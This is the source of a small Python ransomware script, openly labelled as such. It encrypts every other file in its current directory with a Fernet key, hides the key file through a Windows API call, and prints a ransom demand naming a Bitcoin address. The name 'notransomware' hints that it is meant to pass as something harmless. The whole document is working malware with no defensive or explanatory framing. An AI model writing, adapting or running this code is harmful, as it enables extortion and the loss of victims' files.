# IT'S A FUCKING RANSOMWARE
import os
from cryptography.fernet import Fernet
import time
import ctypes

# Get the files in the current directory
files = []
for file in os.listdir():
    if file == "notransomware.py" or file == "Key.key" or file == "Decrypt.py" or file == "notransomware.exe" or file == "Decrypt.exe":
        continue
    if os.path.isfile(file):
        files.append(file)

# Generate a key and save it in a file
Key = Fernet.generate_key()
with open("Key.key", "wb") as key_file:
    key_file.write(Key)

# Make the file "Key.Key" hidden 
FILE_HIDDEN = 0x02
ret = ctypes.windll.kernel32.SetFileAttributesW("Key.key", FILE_HIDDEN)

# Encrypt the files
for file in files:
    with open (file, "rb") as the_file:
        content = the_file.read()
    encrypted = Fernet(Key).encrypt(content)
    with open(file, "wb") as the_file:
        the_file.write(encrypted)

print ("YOU ARE COOKED MATE")
print ("Your files have been encrypted! Send 100$ to this Bitcoin address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa to get the decryption key.")
time.sleep(5)